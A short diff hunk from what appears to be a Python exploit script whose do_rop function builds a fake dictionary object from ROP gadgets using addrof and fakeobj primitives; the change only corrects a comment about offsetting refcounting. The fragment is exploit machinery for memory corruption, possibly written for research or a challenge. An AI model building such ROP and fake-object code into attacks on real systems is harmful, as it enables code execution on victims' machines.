@@ -217,7 +217,7 @@ def do_rop(payload):
 	gadgets = find_gadgets()
 
 	fakedict = fakeobj(refbytes(bytes(p64a(
-		gadgets["pop rax; ret"] - 4,  # subtract for to offset refcounting
+		gadgets["pop rax; ret"] - 4,  # subtract 4 to offset refcounting
 		addrof(dict)
 	) + payload)))
 
